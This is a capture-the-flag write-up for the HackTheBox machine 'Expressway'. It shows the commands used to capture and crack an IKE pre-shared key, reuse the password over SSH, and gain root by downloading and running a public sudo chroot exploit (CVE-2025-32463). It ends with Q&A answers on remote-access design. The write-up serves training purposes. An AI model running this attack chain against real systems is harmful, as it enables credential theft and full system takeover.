## Expressway
### Info:
- Name: **Expressway**
- OS: **Linux**
- Type: **Unauthenticated**
- Difficulty: **Easy**
- Status: **Retired**

### Content:
- [**`testing.md`**](https://github.com/cac3r/htb_machines/blob/main/expressway/testing.md)                - Raw notes / working log
- [**`report.pdf`**](https://github.com/cac3r/htb_machines/blob/main/expressway/report.pdf)                - Professional report
- [**`attack_chain.png`**](https://github.com/cac3r/htb_machines/blob/main/expressway/attack_chain.png)   - Attack chain diagram
- `screenshots/`           - Supporting screenshots

---
---
### Brief:
#### Username and Hash disclosure: Weak IKE communication
Starting the test against the target system `expressway` unauthenticated. After host reconnaissance find only port 22/tcp. Running a UDP scan discover port 500/udp running IKE (Internet Key Exchange), protocol used for peer-to-peer VPN connection. Following [documentation](https://hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html) understand the protocol and start probing it with `ike-scan`. Discover is using weak communication parameters as Aggressive Mode, which sends authentication before creating a secure and encrypted channel and, added to the use of simple PSK, enables to capture the authentication and its PSK hash. This hash is cracked offline using mode 5400 recovering the plaintext password: `freakingrockstarontheroad`. Besides the hash, the handshake discloses information like user and domain: `ike@expressway.htb`. 
#### Foothold: Credential reused for system user
SSH service exposed, potential system user (present in IKE ID) and a password related to that user makes the next logical step to check for password reuse, and turns out valid, establishing a connection via SSH, shell as `ike`.
#### LPE : Vulnerable sudo version 1.9.17 - CVE-2025-32463
Running `linpeas.sh` (PEAS-ng), the tool calls out Sudo version 1.9.17 is vulnerable. Searching for this version surfaces multiple CVEs. One of them, CVE-2025-32463, allows to execute code as root by abusing a trust flaw when using `--chroot`, loading a malicious clone configuration file `nsswitch.conf`. This is automated by a public [script](https://github.com/kh4sh3i/CVE-2025-32463/blob/main/exploit.sh), achieving to execute `/bin/sh` as root, and landing a root shell for the attacker.

---
---
### Techniques:
- 500/udp IKE (ISAKMP) service authentication hash capture (PSK)
- Vulnerable sudo version 1.9.17 LPE (CVE-2025-32463)

---
---
### Lesson:
#### 500/udp IKE (ISAKMP) and authentication capture

What runs over 500/udp is IKE (Internet Key Exchange), which uses ISAKMP. It’s the handshake that sets up an IPsec tunnel. 
It runs in either **Main Mode** or **Aggressive Mode** to establish a secure channel between the two peers.
**Aggressive Mode with PSK** is the classic weakness. In Aggressive Mode, the endpoint sends back a hash of the pre-shared key during the handshake before authentication completes. You can capture that hash and crack it offline to recover the plaintext PSK.
The system running IKE is the gateway, the guarded front door endpoint. It’s a **dedicated gateway device** out front, firewall or VPN concentrator, that terminates the tunnel. The internal servers sit behind it and aren’t directly reachable from the internet. The gateway is the one machine deliberately exposed to accept VPN connections.

Example in this test:

Reading https://hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html understand this protocol is used in Virtual Private Networks, VPNs. Resource uses `ike-scan` to discover users, passwords and capturing the authentication (PSK) to crack it offline.

Follow `ike-scan` installation https://github.com/royhills/ike-scan#building-and-installing

```
ike-scan -A 10.129.238.52
```

![](screenshots/05.png)

- Aggresive Mode enabled
- Auth: PSK
- IKE/Group ID: `ike@expressway.htb`
- User: `ike`
- Domain: `expressway.htb`

```
ike-scan -A --pskcrack=handshake.txt 10.129.238.52
```

```
cat handshake.txt
```

![](screenshots/07.png)

"A recovered group PSK is not inherently a user password. In an authorized assessment, record it as a reusable shared secret and test other services only when the rules of engagement explicitly include credential reuse."

"Hashcat mode `5400` is for IKE-PSK SHA-1"

Trying to crack with mode `5400` using hashcat

```
hashcat -m 5400 handshake.txt rockyou.txt
```

08

Cracked
Password: `freakingrockstarontheroad`

Note: **VPNs** have drifted toward **SSL/TLS-based VPNs** (over 443/TCP) rather than raw IPsec, because 443 sails through firewalls, captive portals, and NAT that can choke IKE. Cisco AnyConnect, Palo Alto GlobalProtect, FortiClient SSL-VPN, etc. So an employee’s remote connection today is often TLS, not IKE, even though the vendor still calls it “VPN.” 
Another option is **WireGuard** over its own UDP port (51820 by default).

A bigger trend: **Zero Trust Network Access (ZTNA)**. Instead of one gateway that dumps you onto the whole internal LAN, ZTNA (things like Zscaler Private Access, Cloudflare Access, Microsoft Entra Private Access, Tailscale) authenticates you per-application and never gives you broad network access. Big enterprises and cloud-forward companies are migrating toward this.

---
#### Vulnerable sudo version 1.9.17 LPE (CVE-2025-32463)

Sudo version is vulnerable. Version 1.9.17. The vulnerability allows a local user to obtain root access because /etc/nsswitch.conf can be loaded from a user-controlled directory when the chroot option is used.

Normally sudo should read the real `/etc/nsswitch.conf`. The flaw is that when you use `--chroot`, sudo resolves and reads `nsswitch.conf` from inside the directory the user controlls, and does this while still running as root.

https://github.com/kh4sh3i/CVE-2025-32463

Downloading the script: 

```
wget https://raw.githubusercontent.com/kh4sh3i/CVE-2025-32463/refs/heads/main/exploit.sh
```

transfrer via SSH

```
scp exploit.sh ike@expressway.htb:/home/ike/
```

Give execution permission

Run it

```
./exploit.sh
```

![](screenshots/15.png)

Connected as root

---
---
#### Q&A:

**Q**: What setup would you employ in a modern environment for remote secure connection?

**A**: *(Claude Opus 4.8)*

The questions that actually decide it

Before picking anything:

- **How big, and how cloud-centric?** A 20-person startup on M365 and a 5,000-person enterprise with on-prem datacentres get very different answers.
- **What needs remote access?** Users reaching apps is a different problem from connecting two offices (site-to-site) — the latter is still IPsec regardless of how modern you are.
- **Where do the apps live?** SaaS, cloud-hosted, on-prem legacy? ZTNA is easy for web apps, harder for legacy thick-client/network-level stuff.
- **Budget and operational maturity?** ZTNA done well needs identity hygiene and device management already in place.

My default for a modern organisation:

If I’m designing user remote access greenfield today, I’d go **identity-first, ZTNA-based**:

1. **Identity provider as the core** — Entra ID or Okta as the single source of truth, with **phishing-resistant MFA** (FIDO2 security keys or passkeys, not SMS). Identity is the perimeter, so this is the foundation everything else leans on.
2. **ZTNA for access to private apps** — Entra Private Access, Cloudflare Access, Zscaler, or Tailscale depending on the stack. Per-application, least-privilege, no flat network access. A compromised account reaches only what policy explicitly grants, not a subnet to roam.
3. **Device posture as a condition** — managed/compliant device (via Intune or equivalent) required before access is granted. Ties access to _healthy device + verified identity_, continuously, not a one-time tunnel check.
4. **Conditional access policies** — risk-based: unusual location/impossible travel/anomalous behaviour triggers step-up auth or blocks.
5. **Segmentation behind it all** — even with ZTNA, internal segmentation so that if something _is_ reached, lateral movement is constrained.

The one-line version: Identity provider + phishing-resistant MFA as the core, ZTNA for user→app access, cert-based IKEv2 only for site-to-site, device posture and conditional access throughout, segmentation behind everything. Least privilege and “verify every time” as the through-line.

---

**Q**: What percentage of people, including employees in companies, reuse a single password across two or more services/accounts?

**A**: *(Claude Opus 4.8)*

Individuals:

- The broadest estimates put it around 80–85% of people reuse passwords across multiple sites, with roughly half of employees admitting to reusing credentials at work too.
- A widely-cited survey found 78% of individuals use the same password for more than one account, with 52% reusing it across at least three accounts, and 4% using one password on 11 or more accounts.
- Even people who “use strong passwords” cheat: 34% admit to repeating variations of the same password across accounts.
- And only about 25% of people globally say they use strong, unique passwords for all of their accounts, which is the flip side of the same problem.

So depending on the threshold, somewhere in the **~50% (reuse across 3+ accounts) to ~80% (reuse across 2+)** range. If someone asks for a single headline number, **around 80% reuse across two or more services** is the defensible one, since that’s the loosest and most-cited definition.

Companies / employees:

This is the part that matters for your pentest reasoning, and it’s worse than people assume:

- Dashlane’s data found enterprise businesses had the highest share of password reuse at 51.7%, ahead of midsize (43.9%) and small businesses (41.8%). Bigger company, more reuse, counterintuitively.
- By industry, reuse runs high across the board, construction topped it at around 52%, with manufacturing (43%) and legal (42%) also high.
- The global average user still carries something like 40–50% reused passwords in their vault.
